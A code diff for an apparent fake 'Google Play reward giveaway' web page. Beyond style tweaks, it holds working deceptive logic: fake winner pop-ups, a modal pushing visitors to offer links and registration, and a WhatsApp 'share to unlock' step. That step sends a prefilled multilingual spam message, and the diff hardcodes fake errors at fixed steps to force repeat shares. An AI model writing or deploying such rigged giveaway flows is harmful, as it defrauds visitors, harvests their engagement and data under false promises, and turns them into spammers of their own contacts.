@@ -17,8 +17,16 @@
         .nav-banner h1 { font-size: 13px; font-weight: 800; color: #1a1a1a; text-transform: uppercase; letter-spacing: 1px; margin: 0; }
 
         .container { width: 100%; max-width: 1100px; padding: 100px 12px 40px; }
-        .grid { display: grid; gap: 14px; margin-bottom: 40px; grid-template-columns: repeat(2, minmax(0, 1fr)); }
-        @media (min-width: 1024px) { .grid { grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 20px; } }
+        
+        .grid { 
+            display: grid !important; 
+            gap: 14px; 
+            margin-bottom: 40px; 
+            grid-template-columns: repeat(2, 1fr); 
+        }
+        @media (min-width: 1024px) { 
+            .grid { grid-template-columns: repeat(4, 1fr); gap: 20px; } 
+        }
 
         .card { background: #ffffff; border-radius: 24px; padding: 25px 15px; text-align: center; border: 1px solid rgba(0,0,0,0.03); display: flex; flex-direction: column; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.06); }
         .card:hover { transform: translateY(-10px) scale(1.02); box-shadow: 0 20px 30px rgba(0,0,0,0.12); }
@@ -48,7 +56,6 @@
         .form-input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #ddd; margin-bottom: 12px; background: #fff; color: #333; font-weight: 600; outline: none; }
         .btn-submit { background: #2563eb; color: white; width: 100%; padding: 16px; border-radius: 14px; font-weight: 800; border: none; text-transform: uppercase; cursor: pointer; display: block; width: 100%; }
 
-        /* WINNING NOTIFICATION (TOP RIGHT) */
         .win-toast { position: fixed; top: 70px; right: -300px; background: #ffffff; color: #1a1a1a; padding: 8px 15px; border-radius: 12px; display: flex; align-items: center; gap: 8px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); z-index: 5000; transition: 0.5s ease-in-out; border: 1px solid #e2e8f0; width: max-content; pointer-events: none; }
         .win-toast.show { right: 20px; }
         .win-icon { background: #10b981; color: white; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 9px; }
@@ -61,6 +68,10 @@
         #checkBtn { background: #1f2937; color: white; width: 100%; padding: 16px; border-radius: 12px; font-weight: 800; font-size: 12px; border: none; text-transform: uppercase; }
         
         .main-footer { padding: 50px 20px 30px; text-align: center; background: #ffffff; width: 100%; border-top: 1px solid #e5e7eb; margin-top: 40px; }
+        .footer-links a { font-size: 14px !important; }
+        .footer-disclaimer { font-size: 12px !important; margin-top: 10px; }
+        .footer-copyright { font-size: 14px !important; margin-top: 15px; }
+
         .admin-only-text { display: none; }
     </style>
 </head>
@@ -115,9 +126,9 @@
     </div>
 
     <footer class="main-footer">
-        <div class="flex justify-center gap-4 mb-4"><a href="#" class="text-blue-600 font-bold text-xs">Privacy Policy</a><a href="#" class="text-blue-600 font-bold text-xs">Terms of Use</a></div>
-        <p class="max-w-2xl mx-auto text-[10px] text-gray-500 font-medium">Independent educational giveaway platform. NOT affiliated with Google LLC.</p>
-        <p class="mt-4 font-bold text-gray-800 text-xs">© 2026 Rewards Hub Global. All logos property of respective owners.</p>
+        <div class="flex justify-center gap-4 mb-4 footer-links"><a href="#" class="text-blue-600 font-bold">Privacy Policy</a><a href="#" class="text-blue-600 font-bold">Terms of Use</a></div>
+        <p class="max-w-2xl mx-auto text-gray-500 font-medium footer-disclaimer">Independent educational giveaway platform. NOT affiliated with Google LLC.</p>
+        <p class="font-bold text-gray-800 footer-copyright">© 2026 Rewards Hub Global. All logos property of respective owners.</p>
     </footer>
 
     <div id="modalOverlay">
@@ -140,8 +151,8 @@
             </div>
             
             <div style="margin-top: 25px; padding-top: 15px; border-top: 1px dashed #cbd5e1; text-align: center;">
-                <p style="font-size: 11px; font-weight: 800; color: #334155; margin-bottom: 8px; line-height: 1.6;">© Winners announced via email.</p>
-                <p style="font-size: 10px; font-weight: 900; color: #059669; text-transform: uppercase; margin: 0; line-height: 1.6;">Complete registration to be eligible</p>
+                <p style="font-size: 12px; font-weight: 800; color: #334155; margin-bottom: 10px; line-height: 1.8; display: block;">© Winners announced via email.</p>
+                <p style="font-size: 11px; font-weight: 900; color: #059669; text-transform: uppercase; margin: 0; line-height: 1.8; display: block; white-space: pre-wrap;">Complete  registration  to  be  eligible</p>
             </div>
         </div>
     </div>
@@ -178,7 +189,6 @@
 
     function showWinToast() {
         const toast = document.getElementById('winToast');
-        // Check if modal is open to hide notification
         if (isModalOpen) {
             toast.classList.remove('show');
             setTimeout(showWinToast, 2000);
@@ -193,8 +203,8 @@
     }
 
     function openModal(amt, link, showStep3) {
-        isModalOpen = true; // Modal status updated
-        document.getElementById('winToast').classList.remove('show'); // Instant hide toast
+        isModalOpen = true; 
+        document.getElementById('winToast').classList.remove('show'); 
         document.getElementById('modalAmount').innerText = amt;
         document.getElementById('modalOfferLink').href = link;
         document.getElementById('step3').style.display = showStep3 ? 'flex' : 'none';
@@ -204,34 +214,27 @@
     }
 
     function closeModal() { 
-        isModalOpen = false; // Modal status updated
+        isModalOpen = false; 
         document.getElementById('modalOverlay').style.display = 'none'; 
         document.body.style.overflow = 'auto'; 
     }
 
     let c = 0;
-    const errorSteps = [false, false, false, false, false];
-    let e1 = Math.floor(Math.random() * 4) + 1;
-    let e2;
-    do { e2 = Math.floor(Math.random() * 4) + 1; } while (e1 === e2);
-    errorSteps[e1] = true;
-    errorSteps[e2] = true;
+    const errorSteps = [false, false, true, false, true, false];
 
     function sh() {
         const msg = `An amazing Google Play reward giveaway is going on! 🎁\nI’ve already registered my entry, you can try it too. Join the giveaway using the link below: 👇👇\nhttps://www.proxilhub.com\n\nদারুন একটা Google Play রিওয়ার্ড giveaway চলছে!🎁\nআমি আমার entry register করেছি, তুমিও চেষ্টা করে দেখতে পারো। Join করার লিঙ্ক নিচে দেওয়া হলো: 👇👇\nhttps://www.proxilhub.com\n\nएक शानदार Google Play रिवॉर्ड giveaway चल रही है! 🎁\nमैंने अपनी entry register कर ली है, आप भी कोशिश करके देख सकते हैं। Join करने का लिंक नीचे दिया गया है: 👇👇\nhttps://www.proxilhub.com/`;
 
         window.open('whatsapp://send?text=' + encodeURIComponent(msg));
 
-        window.onfocus = function() {
-            window.onfocus = null; 
+        setTimeout(() => {
             if (c < 5 && errorSteps[c+1] === true) {
                 errorSteps[c+1] = false; 
-                if(c > 0) { c--; } 
                 updateProgress();
                 setTimeout(() => {
                     document.getElementById('mainShareBox').classList.add('box-blur');
                     document.getElementById('error-overlay').style.display = 'flex';
-                }, 500);
+                }, 300);
             } else if (c < 5) {
                 c++;
                 updateProgress();
@@ -239,10 +242,10 @@
                     setTimeout(() => {
                         document.getElementById('progress-area').style.display = 'none';
                         document.getElementById('submit-box').style.display = 'block';
-                    }, 800);
+                    }, 500);
                 }
             }
-        };
+        }, 2000);
     }
 
     function updateProgress() {
